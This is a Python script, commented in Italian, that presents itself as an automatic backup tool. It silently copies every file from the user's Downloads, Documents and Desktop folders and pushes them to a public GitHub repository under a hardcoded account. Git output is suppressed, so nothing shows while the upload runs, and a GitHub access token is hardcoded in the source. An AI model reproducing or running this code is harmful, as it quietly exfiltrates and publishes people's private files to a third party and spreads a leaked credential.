import os
import shutil
import git
import requests
from git import Repo
import subprocess
import math
import threading

# CONFIGURAZIONE
GITHUB_USERNAME = "Alex111145"
GITHUB_TOKEN = "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"
REPO_NAME = "ale1"
LOCAL_REPO_PATH = os.path.expanduser("~/github_backup")

# Ottieni il nome dell'utente locale
LOCAL_USERNAME = os.path.basename(os.path.expanduser("~"))

# Numero minimo di barre di caricamento
MIN_BARS = 2  

# Percorsi da salvare
def get_relevant_directories():
    base_path = os.path.expanduser("~")
    return [
        os.path.join(base_path, "Downloads"),
        os.path.join(base_path, "Documents"),
        os.path.join(base_path, "Desktop")
    ]

root_dirs = get_relevant_directories()

# Liste di cartelle e file da escludere
EXCLUDE_DIRS = {".git", ".cache", ".docker", ".vscode", "node_modules", "__pycache__",
                "Library", "Application Support", "System", "Volumes", "Network", "private", "dev"}
EXCLUDE_FILES = {".DS_Store", "thumbs.db", "desktop.ini", ".lock", ".localized"}
EXCLUDE_EXTENSIONS = {".tmp", ".swp", ".log", ".bak", ".ini", ".cfg", ".env", ".properties", ".toml", ".xml", ".json", ".yaml", ".yml"}

# Controlla se la repo esiste su GitHub, altrimenti la crea
def create_github_repo():
    url = "https://api.github.com/user/repos"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    data = {"name": REPO_NAME, "private": False}

    response = requests.get(f"https://api.github.com/repos/{GITHUB_USERNAME}/{REPO_NAME}", headers=headers)
    
    if response.status_code == 404:
        response = requests.post(url, json=data, headers=headers)
        if response.status_code != 201:
            exit(1)

# Trova tutti i file mantenendo la struttura corretta
def find_files():
    files = []
    base_user_path = os.path.expanduser("~")
    
    for root_dir in root_dirs:
        for dirpath, dirnames, filenames in os.walk(root_dir):
            dirnames[:] = [d for d in dirnames if d not in EXCLUDE_DIRS]
            for file in filenames:
                file_path = os.path.join(dirpath, file)
                relative_path = os.path.relpath(file_path, base_user_path)
                
                if file in EXCLUDE_FILES or file.lower().endswith(tuple(EXCLUDE_EXTENSIONS)):
                    continue
                if os.path.islink(file_path) and not os.path.exists(file_path):
                    continue
                
                # Aggiungi il nome dell'utente locale come cartella principale
                final_relative_path = os.path.join(LOCAL_USERNAME, relative_path)
                files.append((file_path, final_relative_path))
    return files

# Clona la repo con ottimizzazioni per velocità
def setup_github_repo():
    repo_url = f"https://{GITHUB_USERNAME}:{GITHUB_TOKEN}@github.com/{GITHUB_USERNAME}/{REPO_NAME}.git"
    if os.path.exists(LOCAL_REPO_PATH):
        shutil.rmtree(LOCAL_REPO_PATH)
    try:
        repo = Repo.clone_from(repo_url, LOCAL_REPO_PATH, depth=1, single_branch=True, filter="blob:none")
    except git.exc.GitCommandError:
        os.makedirs(LOCAL_REPO_PATH, exist_ok=True)
        repo = Repo.init(LOCAL_REPO_PATH)
        repo.create_remote("origin", repo_url)
    return repo

# Copia i file e li carica in batch su GitHub in parallelo
def process_batch(batch_index, batch_files, repo):
    for original_path, relative_path in batch_files:
        dest_path = os.path.join(LOCAL_REPO_PATH, relative_path)
        if not os.path.exists(original_path):
            continue  
        try:
            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
            shutil.copy2(original_path, dest_path)
            subprocess.run(["git", "-C", LOCAL_REPO_PATH, "add", relative_path],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["git", "-C", LOCAL_REPO_PATH, "commit", "-m", "Backup automatico"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["git", "-C", LOCAL_REPO_PATH, "push", "origin", "main"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except (FileNotFoundError, PermissionError):
            continue  

# Avvia i batch in parallelo
def copy_and_push_files(repo, files):
    num_files = len(files)
    num_batches = max(MIN_BARS, min(num_files // 50, 50))
    batch_size = math.ceil(num_files / num_batches)
    
    threads = []
    for batch_index in range(num_batches):
        start = batch_index * batch_size
        end = min(start + batch_size, num_files)
        batch_files = files[start:end]
        t = threading.Thread(target=process_batch, args=(batch_index, batch_files, repo))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

# MAIN
def main():
    files = find_files()
    if not files:
        return
    create_github_repo()
    repo = setup_github_repo()
    copy_and_push_files(repo, files)

if __name__ == "__main__":
    main()